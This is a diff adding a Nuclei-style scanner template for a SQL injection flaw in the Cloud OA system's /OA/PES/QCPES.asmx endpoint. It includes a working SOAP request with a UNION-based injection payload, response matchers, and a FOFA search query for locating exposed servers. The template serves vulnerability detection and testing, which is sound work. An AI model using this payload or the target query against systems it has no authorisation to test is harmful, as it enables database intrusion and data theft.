@@ -1,0 +1,48 @@
+id: cloud-oa-qcpes-sqli
+
+info:
+  name: Cloud OA QCPES.asmx - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    cloud OA system /OA/PES/QCPES.asmx page parameters are not properly filtered, resulting in a SQL injection vulnerability, which can be used to obtain sensitive information in the database.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%85%A8%E7%A8%8B%E4%BA%91OA/%E5%85%A8%E7%A8%8B%E4%BA%91OA__ajax.ashxSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
+  tags: 全程云OA
+
+http:
+  - raw:
+      - |
+        POST /OA/PES/QCPES.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        SOAPAction: "http://tempuri.org/GetCode"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCode xmlns="http://tempuri.org/">
+              <fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>
+              <value>1</value>
+            </GetCode>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402201ef7eee5943cd3f135682a31365b7e6e55689cfc32f27191495dd04665d674c402206add4553dd66405401f96e1d14db0797a45c9bfc1beb88c8fd8674137a9d81d7:922c64590222798bb761d5b6d8e72950
